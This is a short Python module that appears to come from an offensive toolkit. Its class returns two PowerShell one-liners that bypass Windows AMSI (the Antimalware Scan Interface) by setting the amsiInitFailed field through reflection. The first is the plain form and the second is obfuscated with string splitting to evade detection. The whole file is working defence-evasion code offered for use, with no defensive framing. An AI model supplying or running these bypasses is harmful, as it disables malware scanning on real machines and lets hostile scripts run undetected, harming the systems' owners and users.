#!/usr/bin/env python3

class AMSIBypass:
    """AMSI (Antimalware Scan Interface) bypass techniques"""
    
    @staticmethod
    def get_basic_bypass():
        """Basic AMSI bypass (often detected)"""
        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    
    @staticmethod
    def get_obfuscated_bypass():
        """Obfuscated AMSI bypass"""
        return """$a=[Ref].Assembly.GetType('Sy'+'ste'+'m.Man'+'age'+'ment.Aut'+'omat'+'ion.Am'+'siUt'+'ils');
$b=$a.GetField('am'+'siIn'+'itFa'+'iled','NonP'+'ublic,St'+'atic');
$b.SetValue($null,$true)"""